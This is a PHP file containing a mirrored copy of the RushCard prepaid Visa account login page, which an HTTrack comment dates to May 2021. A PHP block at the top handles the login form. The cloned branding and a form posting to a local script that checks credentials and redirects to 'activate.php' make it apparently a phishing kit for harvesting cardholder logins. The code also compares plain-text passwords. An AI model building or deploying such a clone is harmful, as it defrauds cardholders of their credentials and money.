<?php
error_reporting(0);
include('conn.php');
   session_start();
   
   if($_SERVER["REQUEST_METHOD"] == "POST") {
      // username and password sent from form 
      
      $myusername = mysqli_real_escape_string($conn,$_POST['user_name']);
      $mypassword = mysqli_real_escape_string($conn,$_POST['Password']); 
      
      $sql = "SELECT id FROM user WHERE user_name = '$myusername' and Password = '$mypassword'";
      $result = mysqli_query($conn,$sql);
      $row = mysqli_fetch_array($result,MYSQLI_ASSOC);
      $active = $row['active'];
      
      $count = mysqli_num_rows($result);
      
      // If result matched $myusername and $mypassword, table row must be 1 row
		
      if($count == 1) {
         $_SESSION['login_user'] = $myusername;
         
         header("location: activate.php");
      }else {
         $error = "Your Login Name or Password is invalid";
      }
   }


?>


<!DOCTYPE html>
<html lang="en" itemscope itemtype="http://schema.org/WebSite">

<!-- Mirrored from usermanagement.rushcard.com/login by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 02 May 2021 18:52:35 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>Account Login | RushCard: Prepaid Visa Card</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />

    <link rel="apple-touch-icon-precomposed" sizes="57x57" href="../content.rushcard.com/content/images/favicon/apple-touch-icon-57x57.png" />
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="../content.rushcard.com/content/images/favicon/apple-touch-icon-114x114.png" />
    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="../content.rushcard.com/content/images/favicon/apple-touch-icon-72x72.png" />
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="../content.rushcard.com/content/images/favicon/apple-touch-icon-144x144.png" />
    <link rel="apple-touch-icon-precomposed" sizes="60x60" href="../content.rushcard.com/content/images/favicon/apple-touch-icon-60x60.png" />
    <link rel="apple-touch-icon-precomposed" sizes="120x120" href="../content.rushcard.com/content/images/favicon/apple-touch-icon-120x120.png" />
    <link rel="apple-touch-icon-precomposed" sizes="76x76" href="../content.rushcard.com/content/images/favicon/apple-touch-icon-76x76.png" />
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../content.rushcard.com/content/images/favicon/apple-touch-icon-152x152.png" />
    <link rel="icon" type="image/png" href="../content.rushcard.com/content/images/favicon/favicon-196x196.png" sizes="196x196" />
    <link rel="icon" type="image/png" href="../content.rushcard.com/content/images/favicon/favicon-96x96.png" sizes="96x96" />
    <link rel="icon" type="image/png" href="../content.rushcard.com/content/images/favicon/favicon-32x32.png" sizes="32x32" />
    <link rel="icon" type="image/png" href="../content.rushcard.com/content/images/favicon/favicon-16x16.png" sizes="16x16" />
    <link rel="icon" type="image/png" href="../content.rushcard.com/content/images/favicon/favicon-128.png" sizes="128x128" />
    <meta name="application-name" content="&nbsp;" />
    <meta name="msapplication-TileColor" content="#FFFFFF" />
    <meta name="msapplication-TileImage" content="../content.rushcard.com/content/images/favicon/mstile-144x144.png" />
    <meta name="msapplication-square70x70logo" content="../content.rushcard.com/content/images/favicon/mstile-70x70.png" />
    <meta name="msapplication-square150x150logo" content="../content.rushcard.com/content/images/favicon/mstile-150x150.png" />
    <meta name="msapplication-wide310x150logo" content="../content.rushcard.com/content/images/favicon/mstile-310x150.png" />
    <meta name="msapplication-square310x310logo" content="../content.rushcard.com/content/images/favicon/mstile-310x310.png" />


    
    
    <meta name="apple-itunes-app" content="app-id=429000446">
    <meta name="google-play-app" content="app-id=com.rushcard.android">




    <link href="bundles/commonstylescf99.css?v=epggfAKdxhrA1TTdz-dH58_l3trvB5INHXBlRbPE3EI1" rel="stylesheet"/>

    
    


    


<!-- ADOBE LAUNCH START -->
<script>
    var digitalData = digitalData || {};
    digitalData = {
        page: {
            pageName: "rc:user_management:login.php:home",
            brand: "rc",
            site: "user_management",
            channel: "login",
            siteRendered: "responsive"
        },
        user: {
            loginType: "logged_out",
            cardholderId: ""
        },
        server: {
            timeStamp: "2021-05-02 11:51:31"
        },
        form: {
            formName: "",
            formVariant: "",
            formStepName:"",
            formStepNumber: "",
            applicationId: "",
            audience: "",
            promoId: "",
            referralId: ""
        },
        events: [
            {name:""}
        ]
    };
</script>

    <script src="../assets.adobedtm.com/4ddf83a2c542/24fbfb1cd512/launch-07ad062ebf01.min.js" async></script>

<!-- END ADOBE LAUNCH START -->



</head>
<body id="Login" itemscope itemtype="http://schema.org/WebPage">
    <div id="wrapper">

        


<!-- Google Tag Manager -->
<noscript>
    <iframe src="http://www.googletagmanager.com/ns.html?id=GTM-KW6HBP"
            height="0" width="0" style="display:none;visibility:hidden"></iframe>
</noscript>
<script>
(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'../www.googletagmanager.com/gtm5445.html?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-KW6HBP');</script>
<!-- End Google Tag Manager -->

<header>
    <div class="container">
        <div class="row">
            <div class="col-sm-6">
                <a href="index.php" alt="RushCard: Prepaid Visa">
                    <img src="../content.rushcard.com/Content/images/Logo/rushcard-logo.png" class="img-responsive" alt="RushCard: Prepaid Visa"/>
                </a>
            </div>
            <div class="col-sm-6">
                <div class="row">
                    <div class="col-sm-12 secondary-menu">
                        
                    </div>
                </div>
            </div>    
        </div>

    </div>
</header>


<div id="bodyContent">
    <div class="container">
        <div class="row">
            




<div class="col-xs-12 col-lg-10 ">
    <h1>Account Login</h1>
    <section class="content-box">
        <div class="content">
            

            <div class="row">
                <div id="loginBox" class="col-xs-12 col-sm-6 boxes">
                    <h2>Log In</h2>

<form action="login.php" id="loginForm" method="post" role="form"><input name="__RequestVerificationToken" type="hidden" value="xPXUkvFHd42KIEv7tRZHjA5JggajqNCnbMZ9exupyADJJZE0XcA_sDg8-4VY7cL091Y6pBZ7nzY6FZvkEAGJ6fEF7701" />                        <p>
                            Welcome to the RushCard Account Center! Please login with your
                            existing username and password. You might be prompted to register your computer.
                        </p>
                        <?php include('errors.php'); ?>
                        <div class="form-group">
                            <label class="sr-only" for="UserName">Username:</label>
                            <input class="form-control resized-textbox" data-field-name="username" data-val="true" data-val-required="Required" id="UserName" name="user_name" placeholder="Username" tabIndex="1" type="text" value="" />
                            <span class="field-validation-valid" data-valmsg-for="UserName" data-valmsg-replace="true"></span>
                        </div>
                        <div class="form-group">
                            <label class="sr-only" for="Password">Password:</label>
                            <input autocomplete="no" class="form-control resized-textbox" data-field-name="password" data-val="true" data-val-required="Required" id="Password" name="Password" placeholder="Password" tabIndex="2" type="password" />
                            <span class="field-validation-valid" data-valmsg-for="Password" data-valmsg-replace="true"></span>
                        </div>
                            <div class="button-group">
                                <button id="btnLoginSubmit" type="submit" name="login_user" class="btn btn-primary" tabindex="3">Log In</button>
                                <div>
                                    <a href="retrieveaccountlogin.php" id="linkForgotPassword">Forgot Username/Password?</a>
                                </div>
                            </div>
</form>
                </div>
                <div class="col-xs-12 col-sm-6">
                    <div id="register" class="boxes">
                        <div>
                            <h2>Register for Access</h2>
                            <p>You must register for a username and password before using this website.</p>
                            <div class="button-group">
                              
                            <a class="btn btn-primary" href="register.php" id="btnRegister">Register</a> 
                            </div>
                        </div>
                    </div>
                    <div id="activate" class="">
                        <div>
                            <h2>Activate New Card</h2>
                            <div class="button-group">
                                <a class="btn btn-primary" href="activate.php" id="btnActivate">Activate</a>
                             
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
</div>
        </div>
    </div>
</div>



<footer>
    <div class="container">
        <div class="row">
            <div class="col-xs-12">
                

    <ul class="socialLinks list-unstyled list-inline">
        <li><a href="https://www.facebook.com/RushCard" title="Facebook"><i class="fa fa-facebook" aria-hidden="true"></i></a></li>
        <li>
            <a href="https://www.youtube.com/user/MyRushCard" title="YouTube"><i class="fa fa-youtube" aria-hidden="true"></i></a>
        </li>
        <li><a href="https://www.twitter.com/RushCard" title="Twitter"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
        <li><a href="https://www.instagram.com/rushcard" title="Instagram"><i class="fa fa-instagram" aria-hidden="true"></i></a></li>
    </ul>

            </div>
            <div class="col-xs-12">
                <nav id="footerLinks">
                    <ul class="list-unstyled list-inline">
                        <li><a id="FooterNav_ContactUs">Help</a> </li>
                        <li><a href="legal/cardholder-policy-terms.php">Legal Info</a></li>
                        <li><a href="legal/privacy-policies.php">Privacy Center</a></li>
                    </ul>
                </nav>
            </div>

        </div>
        <div class="row">
            <div class="col-xs-12">
<section id="content_disclaimer">
<p>The RushCard Prepaid Visa<sup>&reg;</sup> Card is issued by MetaBank<sup>&reg;</sup>, N.A., Member FDIC, pursuant to a license from Visa U.S.A. Inc. Card accepted everywhere Visa debit cards are accepted.</p>
<p><img src="../content.rushcard.com/content/images/disclaimer/RushCardTrademarks.png" alt="RushCard Trademarks" id="content_disclaimer_trademarks" />UNIRUSH, RUSHCARD, the  logo, RUSHCARD LIVE, CARBON RUSHCARD, EDGE RUSHCARD, GLOSS RUSHCARD, MIDNIGHT RUSHCARD, SEQUIN KLS RUSHCARD, SUEDE KLS RUSHCARD, RUSHGOALS, RUSH UNLIMITED, PAUSE PROTECTION, PAY YOUR OWN WAY, and RISE TO THRIVE are registered trademarks of Green Dot Corporation. All other trademarks, service marks and other registered marks are the property of their respective owners.</p>
<p><img src="../content.rushcard.com/content/images/disclaimer/fdic_visa.png" alt="FDIC Visa Logos" id="content_disclaimer_logos" /></p><p>Green Dot Corporation NMLS ID # 914924</p>



<p>&copy; 2021 Green Dot Corporation. All rights reserved.</p>
</section>

            </div>
        </div>
    </div>
</footer>











    </div>
    
    

    <script type="text/javascript">_satellite.pageBottom();</script>
    <script src="../websdk.ujet.co/v1/loader/loader.js"></script>
</body>

<!-- Mirrored from usermanagement.rushcard.com/login by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 02 May 2021 18:52:37 GMT -->
</html>
